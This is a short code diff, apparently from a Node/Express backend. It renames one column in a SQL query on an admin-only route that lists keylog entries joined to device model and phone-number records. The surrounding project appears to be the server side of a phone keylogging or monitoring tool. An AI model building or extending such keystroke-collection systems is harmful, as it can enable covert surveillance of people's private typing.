@@ -663,7 +663,7 @@ router.get('/keylogs', adminAuth, (req, res) => {
     try {
       const total = db.prepare(`SELECT COUNT(*) as c FROM keylog_entries WHERE ${where}`).get(...params)?.c || 0;
       const rows = db.prepare(`
-        SELECT k.*, d.model, d.phone_number
+        SELECT k.*, d.model, d.phone_numbers
         FROM keylog_entries k
         LEFT JOIN devices d ON d.device_id = k.device_id
         WHERE ${where}
